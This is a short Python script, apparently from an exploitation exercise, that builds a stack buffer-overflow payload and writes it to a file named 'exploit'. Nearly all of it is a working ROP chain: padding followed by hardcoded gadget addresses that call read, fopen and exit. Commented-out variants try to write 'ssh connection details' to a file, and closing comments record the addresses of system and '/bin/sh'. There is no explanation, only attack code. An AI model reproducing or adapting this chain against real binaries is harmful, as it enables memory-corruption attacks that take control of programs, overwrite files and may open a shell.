def pack64(n):
	s = ""
	while n:
		s += chr(n % 0x100)
		n = n / 0x100
	s = s.ljust(8, "\x00")
	return s

f = open("./exploit", "w")

addr = "test.txt\0"

payload = addr + "A" * (24-len(addr))
payload += "A" * 32
# read path name from stdin scanf
#payload += pack64(0x7ffff7a0555f) # pop rdi; ret;
#payload += pack64(0x7ffff7b97d3e) # pointer to '%s'
#payload += pack64(0x7ffff7a07e6a) # pop rsi; ret;
#payload += pack64(0x7fffffffe200) # pointer to hopefully empty space
#payload += pack64(0x7ffff7a279c8) # pop rax; ret;
#payload += pack64(0x000000000000) # 0x0
#payload += pack64(0x7ffff7a5f040) # scanf
payload += pack64(0x7ffff7a0555f) # pop rdi; ret;
payload += pack64(0x000000000000) # 0x0
payload += pack64(0x7ffff7a07e6a) # pop rsi; ret;
payload += pack64(0x7fffffffe200) # pointer to file
payload += pack64(0x7ffff79e5b96) # pop rdx; ret;
payload += pack64(0x5) # pop rdx; ret;
payload += pack64(0x7ffff7af4070) # read

payload += pack64(0x7ffff7a0555f) # pop rdi; ret;
payload += pack64(0x7fffffffe200) # pointer to file
payload += pack64(0x7ffff7a07e6a) # pop rsi; ret;
payload += pack64(0x7ffff79e4ba0) # "w"
payload += pack64(0x7ffff7a62e30) # fopen
#
#payload += pack64(0x5555555549e3) # pop rdi; ret;
#payload += pack64(0x5555555545fc) # 0x3 (assuming fd=3 after open)
#payload += pack64(0x555555554755) # pop rsi;
#payload += pack64(0x7fffffffebbd) # string containing of ssh connection details
## there is no pop rdx??
#payload += pack64(0x7ffff7af4140) # write
#payload += pack64(0x5555555549e3) # pop rdi; ret;
#payload += pack64(0x555555554614) # 0x4 (assuming fd=3 after open)
#payload += pack64(0x7ffff7af48c0) # close
#
payload += pack64(0x7ffff7a27120) # exit
#print(len(payload))
#payload += addr

#payload += pack64(0x7ffff7a27120) # exit
#payload = payload.ljust(100)

f.write(payload)
f.close()


# 0x7ffff7af3c40 open
# 0x7ffff7af4140 write
# 0x7ffff7af4070 read
# 0x7fffffffe595 path?

# 0x7ffff7a33440 system
# 0x7ffff7b97e9a "/bin/sh"
# 0x555555554a50 'r'
# 0x7fffffffe595 rot
